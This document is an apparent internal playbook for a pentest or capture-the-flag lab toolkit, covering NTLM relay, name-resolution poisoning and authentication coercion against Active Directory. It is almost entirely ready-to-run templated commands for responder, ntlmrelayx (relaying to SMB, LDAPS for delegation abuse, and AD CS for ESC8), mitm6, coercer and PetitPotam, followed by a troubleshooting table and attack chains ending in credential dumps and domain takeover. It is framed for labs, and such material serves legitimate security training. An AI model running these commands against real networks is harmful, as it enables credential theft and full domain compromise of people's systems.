# Relay / poison / coerce (senior)

Same L2 only. Skip on HTB `tun0`. The automator will not run these (they hang).

## When / not

Use when: you share a broadcast domain with the lab (GOAD host-only, local VNet).
Do not use on a routed PWN VPN. LLMNR will not cross.

Prefer **LDAP/ADCS relay** when every SMB host has `signing:True`.

## Listeners

```
# hashes only, no WPAD auth storm
responder -I {{IFACE}} -wdA
# WPAD + HTTP/SMB (noisier)
responder -I {{IFACE}} -wd

impacket-ntlmrelayx -tf /logs/enum/relay.txt -smb2support -socks -of /logs/hashes/relay
# LDAP → RBCD / shadow / add-computer
impacket-ntlmrelayx -t ldaps://{{DC}} -smb2support --delegate-access --escalate-user {{USER}}
# ESC8
impacket-ntlmrelayx -t http://ca.{{DOMAIN}}/certsrv/certfnsh.asp -smb2support --adcs

mitm6 -d {{DOMAIN}} -i {{IFACE}}     # IPv6 RA → LDAP/HTTP
```

`nxc smb {{CIDR}} --gen-relay-list` is the target file. Empty list = do not start ntlmrelayx.

## Coerce (need any cred)

```
coercer coerce -t {{DC}} -l {{ATTACK}} -u '{{DOMAIN}}/{{USER}}' -p '{{PASS}}'
# or
petitpotam.py {{ATTACK}} {{DC}}                  # unauth on some builds
# printerbug / dfscoerce / PetitPotam / EfsRpc — pick what the box still allows
```

Coerce a host that is **unconstrained** or into a relay you already have listening.

## krbrelayx

When you have a victim TGT forwarded (UC) or a DNS take-over. Not step one.

## Read this

- Responder `NetNTLMv2` → hashcat `5600`. Crack *or* relay, not both on the same handshake.
- ntlmrelayx `SOCKS` + `[*] Authenticating against smb://` → `proxychains nxc smb …`.
- `--adcs` prints a base64 cert → `certipy auth -pfx`.
- `--delegate-access` → you now have RBCD on the DC/computer → `getST`.

## Fail → next

| Symptom | Next |
| --- | --- |
| no broadcasts | you are not on L2. skip to AS-REP/spray |
| SMB signing required on every host | relay LDAP or HTTP/ADCS |
| channel binding / EPA | LDAPS relay dies. try HTTP ESC8 or drop to crack |
| coerce `access denied` | need a cred, or that RPC is patched — try another |
| IPv6 off | mitm6 is dead. stay on LLMNR |
| captured DA, cannot crack 5600 | relay it next time, don’t keep cracking |

## Chain

signing:False → ntlmrelayx SOCKS → dump.
signing:True + CA web → ESC8.
signing:True + no CA → LDAP RBCD or just crack NetNTLMv2.
Unconstrained host + coerce DC → extract forwarded TGT (Rubeus / krbrelayx).
